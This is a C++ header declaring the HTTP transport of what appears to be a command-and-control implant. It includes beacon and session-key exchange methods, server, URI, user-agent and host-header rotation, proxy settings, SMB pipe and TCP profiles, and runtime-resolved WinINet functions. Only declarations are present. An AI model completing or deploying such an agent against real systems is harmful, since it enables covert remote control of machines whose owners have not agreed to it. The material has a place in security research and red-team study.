#pragma once

#include <windows.h>
#include <wininet.h>
#include "Connector.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	ULONG  uri_count;
	BYTE** uris;
	BYTE*  parameter;
	ULONG  ua_count;
	BYTE** user_agents;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	ULONG  hh_count;
	BYTE** host_headers;
	BYTE   rotation_mode;   // 0=sequential, 1=random
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;
#endif

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

class ConnectorHTTP : public Connector
{
	ULONG  ua_count       = 0;
	CHAR** user_agents    = NULL;
	ULONG  ua_index       = 0;
	ULONG  hh_count       = 0;
	CHAR** host_headers   = NULL;
	ULONG  hh_index       = 0;
	BOOL   ssl            = FALSE;
	CHAR*  http_method    = NULL;
	ULONG  server_count   = 0;
	CHAR** server_address = NULL;
	WORD*  server_ports   = 0;
	ULONG  uri_count      = 0;
	CHAR** uris           = NULL;
	ULONG  uri_index      = 0;
	CHAR*  headers        = NULL;
	ULONG  ans_size       = 0;
	ULONG  ans_pre_size   = 0;
	BYTE   rotation_mode  = 0;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	BYTE  proxy_type     = PROXY_TYPE_NONE;
	CHAR* proxy_url      = NULL;
	CHAR* proxy_username = NULL;
	CHAR* proxy_password = NULL;

	HTTPFUNC* functions = NULL;

	HINTERNET hInternet = NULL;
	HINTERNET hConnect  = NULL;

	ULONG server_index = 0;

public:
	ConnectorHTTP();

	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void CloseConnector() override;

	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;

private:
	void SendData(BYTE* data, ULONG data_size);
};